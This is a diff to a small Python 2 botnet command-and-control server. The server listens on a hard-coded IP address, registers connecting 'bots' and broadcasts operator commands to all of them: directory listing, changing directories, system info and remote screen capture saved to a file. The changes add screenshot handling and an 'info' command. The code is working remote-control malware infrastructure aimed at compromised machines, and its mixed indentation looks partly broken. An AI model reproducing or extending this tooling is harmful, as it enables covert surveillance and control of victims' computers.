@@ -1,5 +1,6 @@
 import socket
 from threading import *
+from time import sleep
 
 serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = "45.55.59.112"
@@ -20,6 +21,7 @@ class Bot(Thread):
         self.addr = address
 	self.last_message = ''
 	self.received = False
+	self.screen_capping = False
 	self.start()
 
     def execute_command(self, cmd):
@@ -27,23 +29,24 @@ class Bot(Thread):
 	self.last_message = ''
 	self.sock.send(cmd)
 	if cmd == 'scrn':
+	    self.screen_capping = True
 	    screen_cap = open('cap', 'w')
 	    while not self.received:
 		pass
 	    screen_cap.write(self.last_message)
 	
-
     def run(self):
-	message = ''
 	while True:
+	    message = ''
 	    while 'EOF' not in message:
                 message += self.sock.recv(4096)
             message = message[:-3]
-	    if len(message) < 100:
-	    	print 'Client', self.addr, ':\n', message
+	    if not self.screen_capping:
+	    	print 'Bot', self.addr, '\n' + message.decode()
+ 	    else:
+		self.screen_capping = False
 	    self.last_message = message
 	    self.received = True
-	
 
 
 class Controller(Thread):
@@ -58,7 +61,6 @@ class Controller(Thread):
 	    clientsocket, address = serversocket.accept()
 	    self.bots.append(Bot(clientsocket, address))
 	    
-	    
 
 controller = Controller()
 while True:
@@ -69,10 +71,11 @@ while True:
     
     valid_cmd = False
     if (cmd == 'ls' or cmd.split(' ')[0] == 'cd' or cmd == 'pwd' or
-       cmd == 'scrn'):
+        cmd == 'info' or cmd == 'scrn'):
 	valid_cmd = True
 	
     if valid_cmd:
         for bot in controller.bots:
             bot.execute_command(cmd)
+	    sleep(2)
 	
